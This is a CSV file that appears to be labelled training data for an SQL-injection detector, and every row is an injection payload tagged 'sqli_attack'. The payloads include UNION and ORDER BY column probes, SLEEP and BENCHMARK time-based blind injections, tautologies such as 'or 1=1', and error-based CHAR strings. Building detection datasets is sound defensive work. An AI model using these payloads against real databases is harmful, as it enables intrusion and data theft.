"query","label"
"'ORDER BY 9'","sqli_attack"
"',(select * from (select(sleep(10)))a)'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12--'","sqli_attack"
"'AND 1=0#'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#'","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2'","sqli_attack"
"'AND 0'","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),3'","sqli_attack"
"'or benchmark(50000000,MD5(1))#'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'","sqli_attack"
"'or 1=1'","sqli_attack"
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))--'","sqli_attack"
"'ORDER BY 11--'","sqli_attack"
"''-''","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8--'","sqli_attack"
"'ORDER BY 31337#'","sqli_attack"
"'AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#'","sqli_attack"
"'ORDER BY SLEEP(5)--'","sqli_attack"
"'ORDER BY 1,SLEEP(5),3--'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#'","sqli_attack"
"'ORDER BY 18#'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#'","sqli_attack"
"'ORDER BY 2--'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#'","sqli_attack"
"'or benchmark(50000000,MD5(1))'","sqli_attack"
"'#	    Hash comment'","sqli_attack"
